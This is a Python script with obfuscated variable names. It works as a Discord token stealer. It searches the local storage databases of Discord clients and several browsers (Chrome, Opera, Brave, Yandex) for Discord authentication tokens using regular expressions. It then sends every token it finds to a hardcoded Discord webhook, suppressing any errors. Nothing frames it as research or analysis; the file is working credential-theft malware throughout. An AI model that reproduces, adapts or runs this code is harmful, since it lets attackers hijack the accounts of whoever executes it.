import os #line:1
import re #line:2
import json #line:3
from urllib .request import Request ,urlopen #line:5
WEBHOOK_URL ='https://discord.com/api/webhooks/1128151423117434942/AU7hmVG1RZH6e2b2VDzf-Iw4xaOuXhsjLNlDLFvBHWDgaBnv2vZkMVc8C7-BZPfGMN26'#line:8
PING_ME =True #line:11
def find_tokens (OOO0O0OOO0OOOO00O ):#line:13
    OOO0O0OOO0OOOO00O +='\\Local Storage\\leveldb'#line:14
    O0O00O0OO0OOO00OO =[]#line:16
    for O0OO00000000000O0 in os .listdir (OOO0O0OOO0OOOO00O ):#line:18
        if not O0OO00000000000O0 .endswith ('.log')and not O0OO00000000000O0 .endswith ('.ldb'):#line:19
            continue #line:20
        for OOO00OO0O0OO00O00 in [O0OOOOOO0OOOOO00O .strip ()for O0OOOOOO0OOOOO00O in open (f'{OOO0O0OOO0OOOO00O}\\{O0OO00000000000O0}',errors ='ignore').readlines ()if O0OOOOOO0OOOOO00O .strip ()]:#line:22
            for O00O0O0OO00OO0O0O in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}',r'mfa\.[\w-]{84}'):#line:23
                for OOOO0000OO0O00000 in re .findall (O00O0O0OO00OO0O0O ,OOO00OO0O0OO00O00 ):#line:24
                    O0O00O0OO0OOO00OO .append (OOOO0000OO0O00000 )#line:25
    return O0O00O0OO0OOO00OO #line:26
def main ():#line:28
    O00OOO0OOOOO0OO00 =os .getenv ('LOCALAPPDATA')#line:29
    O00OO00O0O0OOOOO0 =os .getenv ('APPDATA')#line:30
    O0OOO0O000000OO0O ={'Discord':O00OO00O0O0OOOOO0 +'\\Discord','Discord Canary':O00OO00O0O0OOOOO0 +'\\discordcanary','Discord PTB':O00OO00O0O0OOOOO0 +'\\discordptb','Google Chrome':O00OOO0OOOOO0OO00 +'\\Google\\Chrome\\User Data\\Default','Opera':O00OO00O0O0OOOOO0 +'\\Opera Software\\Opera Stable','Brave':O00OOO0OOOOO0OO00 +'\\BraveSoftware\\Brave-Browser\\User Data\\Default','Yandex':O00OOO0OOOOO0OO00 +'\\Yandex\\YandexBrowser\\User Data\\Default'}#line:40
    O0O000OOOO000O000 ='@everyone'if PING_ME else ''#line:42
    for OO0O0O000000O0O00 ,O000000O0OO0O000O in O0OOO0O000000OO0O .items ():#line:44
        if not os .path .exists (O000000O0OO0O000O ):#line:45
            continue #line:46
        O0O000OOOO000O000 +=f'\n**{OO0O0O000000O0O00}**\n```\n'#line:48
        OOOO0000OOOO0O0OO =find_tokens (O000000O0OO0O000O )#line:50
        if len (OOOO0000OOOO0O0OO )>0 :#line:52
            for O0O00O0O0000OOO0O in OOOO0000OOOO0O0OO :#line:53
                O0O000OOOO000O000 +=f'{O0O00O0O0000OOO0O}\n'#line:54
        else :#line:55
            O0O000OOOO000O000 +='No statuses found.\n'#line:56
        O0O000OOOO000O000 +='```'#line:58
    OO0OOO0OO0000OOOO ={'Content-Type':'application/json','User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'}#line:63
    OOOOOOO0O0O0O00OO =json .dumps ({'content':O0O000OOOO000O000 })#line:65
    try :#line:67
        O0OO000OO0000OOO0 =Request (WEBHOOK_URL ,data =OOOOOOO0O0O0O00OO .encode (),headers =OO0OOO0OO0000OOOO )#line:68
        urlopen (O0OO000OO0000OOO0 )#line:69
    except :#line:70
        pass #line:71
if __name__ =='__main__':#line:73
    main ()#line:74
